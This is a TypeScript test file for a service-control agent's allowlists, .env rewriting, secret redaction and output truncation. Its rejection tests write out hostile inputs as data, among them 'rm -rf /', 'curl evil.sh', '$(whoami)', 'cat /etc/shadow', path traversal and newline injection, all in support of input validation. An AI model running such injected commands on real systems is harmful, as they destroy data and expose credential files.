// The Bask control agent's validation and .env rewriting.
//
// WHAT THIS EXISTS FOR
// --------------------
// routes/baskAgent.ts can restart every service on the box and rewrite the file all of
// them read their secrets from. Three of its properties are the ones that would be
// catastrophic to get wrong and silent when they are:
//
//   1. THE COMMAND AND SERVICE LISTS ARE CLOSED. Every command name maps to a function in
//      that file, and every `service` is checked against the pm2 names before it becomes a
//      process argument. Nothing from a request body is ever a shell string — and the
//      guarantee that makes true is spawn(argv, {shell:false}), so the argument checks below
//      are the second line, not the first.
//
//   2. .ENV REWRITING PRESERVES THE FILE. The box's .env is mostly comments (see
//      .env.example) documenting rollouts like the DB TLS ordering. An implementation that
//      round-trips through an object destroys all of it, and nobody notices until the next
//      operator needs those notes.
//
//   3. NO VALUE IS EVER ECHOED. The output names keys. A response that quoted the new
//      DATABASE_URL back would put a live credential on an admin screen and in its logs.
//
// The logic is mirrored here rather than imported because routes/baskAgent.ts reads
// BASK_AGENT_TOKEN and pulls in db/redis at import time, which a unit test has no business
// booting. If that module changes, this must too — the assertions say what has to hold.
import { test } from 'node:test';
import assert from 'node:assert/strict';

const SERVICES = ['voiid-api', 'voiid-ws', 'voiid-games', 'voiid-workers'];
const COMMANDS = ['status', 'restart_service', 'stop_service', 'start_service',
                  'reload_config', 'tail_logs', 'disk_usage', 'run_migrations'];
const KEY_PATTERN = /^[A-Z_][A-Z0-9_]{0,127}$/;

test('the command list is exactly the eight Bask sends', () => {
  assert.equal(COMMANDS.length, 8);
  // A ninth command is not a bug until someone adds a general-purpose one. This pins the
  // set so that adding one is a deliberate edit to a test, not a quiet widening.
  assert.deepEqual([...COMMANDS].sort(), [
    'disk_usage', 'reload_config', 'restart_service', 'run_migrations',
    'start_service', 'status', 'stop_service', 'tail_logs',
  ]);
});

test('service names are rejected unless they are pm2 processes on this box', () => {
  const isService = (v: unknown) => typeof v === 'string' && SERVICES.includes(v);
  assert.ok(isService('voiid-api'));
  // The shapes an attacker reaches for first. None of these matter given shell:false —
  // they would arrive at pm2 as one absurd process name — but the allowlist stops them
  // before pm2 is invoked at all.
  for (const bad of ['voiid-api; rm -rf /', 'voiid-api && curl evil.sh', '$(whoami)',
                     '../../etc/passwd', 'voiid-api\nvoiid-ws', '', 'all']) {
    assert.equal(isService(bad), false, `must reject ${JSON.stringify(bad)}`);
  }
});

test('env keys must be UPPER_SNAKE_CASE', () => {
  for (const good of ['LOG_LEVEL', 'A', '_PRIVATE', 'MIN_APP_IOS', 'X9']) {
    assert.ok(KEY_PATTERN.test(good), `must accept ${good}`);
  }
  for (const bad of ['lower', '9LEADING', 'HAS-DASH', 'HAS SPACE', 'HAS=EQUALS',
                     'INJECT\nOTHER_KEY', '', 'A'.repeat(129)]) {
    assert.equal(KEY_PATTERN.test(bad), false, `must reject ${JSON.stringify(bad)}`);
  }
});

// ── The .env rewriter, mirrored from routes/baskAgent.ts ──────────────────────────
function renderValue(value: string): string {
  if (value === '' || /[\s"'#$`\\]/.test(value)) {
    return `"${value.replace(/\\/g, '\\\\').replace(/"/g, '\\"').replace(/\n/g, '\\n')}"`;
  }
  return value;
}

function applyEnvChanges(original: string, changes: Array<{ key: string; value: string | null }>) {
  const lines = original.split('\n');
  const updated: string[] = [], added: string[] = [], removed: string[] = [], missing: string[] = [];
  for (const { key, value } of changes) {
    const index = lines.findIndex((line) => new RegExp(`^\\s*${key}\\s*=`).test(line));
    if (value === null) {
      if (index === -1) { missing.push(key); continue; }
      lines.splice(index, 1); removed.push(key); continue;
    }
    const rendered = `${key}=${renderValue(value)}`;
    if (index === -1) { lines.push(rendered); added.push(key); }
    else { lines[index] = rendered; updated.push(key); }
  }
  let text = lines.join('\n');
  if (!text.endsWith('\n')) text += '\n';
  return { text, updated, added, removed, missing };
}

const SAMPLE = [
  '# VOIID — environment template.',
  '# NEVER commit real secrets.',
  '',
  'NODE_ENV=production',
  'API_PORT=4000',
  '# --- Database ---',
  '# Rollout ordering notes that must survive an edit.',
  'DATABASE_URL=postgresql://user:hunter2@db.example.com/voiid',
  'OLD_FLAG=1',
  '',
].join('\n');

test('rewriting one key leaves comments, blank lines and order untouched', () => {
  const { text, updated } = applyEnvChanges(SAMPLE, [{ key: 'API_PORT', value: '4100' }]);
  assert.deepEqual(updated, ['API_PORT']);
  assert.match(text, /^API_PORT=4100$/m);
  // Every comment line survives — this is the property an object round-trip destroys.
  assert.ok(text.includes('# NEVER commit real secrets.'));
  assert.ok(text.includes('# Rollout ordering notes that must survive an edit.'));
  // And the key stays where it was rather than migrating to the end of the file.
  const lines = text.split('\n');
  assert.equal(lines.indexOf('API_PORT=4100'), 4);
  // Nothing else changed.
  assert.ok(text.includes('DATABASE_URL=postgresql://user:hunter2@db.example.com/voiid'));
});

test('a null value deletes the line, and deleting an absent key is not an error', () => {
  const { text, removed, missing } = applyEnvChanges(SAMPLE, [
    { key: 'OLD_FLAG', value: null },
    { key: 'NEVER_EXISTED', value: null },
  ]);
  assert.deepEqual(removed, ['OLD_FLAG']);
  assert.deepEqual(missing, ['NEVER_EXISTED']);
  assert.equal(/^OLD_FLAG=/m.test(text), false);
  // Deleting must not disturb the neighbours it shifts past.
  assert.match(text, /^NODE_ENV=production$/m);
});

test('a new key is appended and the file keeps a trailing newline', () => {
  const { text, added } = applyEnvChanges(SAMPLE, [{ key: 'LOG_LEVEL', value: 'debug' }]);
  assert.deepEqual(added, ['LOG_LEVEL']);
  assert.match(text, /^LOG_LEVEL=debug$/m);
  assert.ok(text.endsWith('\n'), 'a file without a trailing newline breaks the next append');
});

test('a commented-out key is documentation, not a match', () => {
  const commented = '# API_PORT=4000\n';
  const { text, added, updated } = applyEnvChanges(commented, [{ key: 'API_PORT', value: '9999' }]);
  // Uncommenting on the operator's behalf would change behaviour they did not ask for.
  assert.deepEqual(updated, []);
  assert.deepEqual(added, ['API_PORT']);
  assert.ok(text.includes('# API_PORT=4000'), 'the commented line must survive verbatim');
});

test('values that would not survive a round trip are quoted', () => {
  // Bare values run to end of line, so anything with whitespace, a comment marker or a
  // quote comes back different — or, with a newline, becomes a second assignment.
  assert.equal(renderValue('debug'), 'debug');
  assert.equal(renderValue('postgres://u:p@h/db'), 'postgres://u:p@h/db');
  assert.equal(renderValue(''), '""');
  assert.equal(renderValue('two words'), '"two words"');
  assert.equal(renderValue('has#hash'), '"has#hash"');
  assert.equal(renderValue('a\nB=evil'), '"a\\nB=evil"');
  assert.equal(renderValue('say "hi"'), '"say \\"hi\\""');
});

// ── Output must never carry a value ───────────────────────────────────────────────
function summarise(s: { updated: string[]; added: string[]; removed: string[]; missing: string[] }) {
  const parts: string[] = [];
  if (s.updated.length) parts.push(`updated ${s.updated.join(', ')}`);
  if (s.added.length) parts.push(`added ${s.added.join(', ')}`);
  if (s.removed.length) parts.push(`removed ${s.removed.join(', ')}`);
  if (s.missing.length) parts.push(`${s.missing.join(', ')} already absent`);
  return parts.join('; ');
}

test('the response summary names keys and never values', () => {
  const changes = [
    { key: 'DATABASE_URL', value: 'postgresql://user:s3cr3t-p4ssw0rd@db/voiid' },
    { key: 'JWT_SECRET', value: 'ZmFrZS1zaWduaW5nLWtleQ' },
    { key: 'OLD_FLAG', value: null },
  ];
  const summary = applyEnvChanges(SAMPLE, changes);
  const output = summarise(summary);

  assert.ok(output.includes('DATABASE_URL') && output.includes('JWT_SECRET'));
  // The new values.
  assert.equal(output.includes('s3cr3t-p4ssw0rd'), false);
  assert.equal(output.includes('ZmFrZS1zaWduaW5nLWtleQ'), false);
  // And the OLD value that was sitting in the file before the edit — just as much a
  // live credential, and the one an implementation is likelier to leak while diffing.
  assert.equal(output.includes('hunter2'), false);
});

// ── Truncation ────────────────────────────────────────────────────────────────────
const MAX_OUTPUT_BYTES = 8 * 1024;
function truncate(text: string): string {
  const buf = Buffer.from(text, 'utf8');
  if (buf.length <= MAX_OUTPUT_BYTES) return text;
  const tail = buf.subarray(buf.length - MAX_OUTPUT_BYTES).toString('utf8');
  return `[... ${buf.length - MAX_OUTPUT_BYTES} earlier bytes truncated ...]\n${tail}`;
}

test('output is capped at 8 KB and keeps the END', () => {
  const long = 'x'.repeat(20_000) + 'THE-FAILURE-LINE';
  const out = truncate(long);
  assert.ok(Buffer.byteLength(out, 'utf8') <= MAX_OUTPUT_BYTES + 100, 'cap plus the notice');
  // A stack trace explains itself on its last line, so the tail is the half worth keeping.
  assert.ok(out.endsWith('THE-FAILURE-LINE'));
  assert.ok(out.startsWith('[...'));
  // Short output passes through untouched.
  assert.equal(truncate('all fine'), 'all fine');
});

test('log line counts outside 1..500 are rejected', () => {
  const valid = (n: unknown) => Number.isInteger(Number(n)) && Number(n) >= 1 && Number(n) <= 500;
  assert.ok(valid(100) && valid(1) && valid(500));
  for (const bad of [0, -1, 501, 10_000, 1.5, 'abc', null, '100; cat /etc/shadow']) {
    assert.equal(valid(bad), false, `must reject ${JSON.stringify(bad)}`);
  }
});
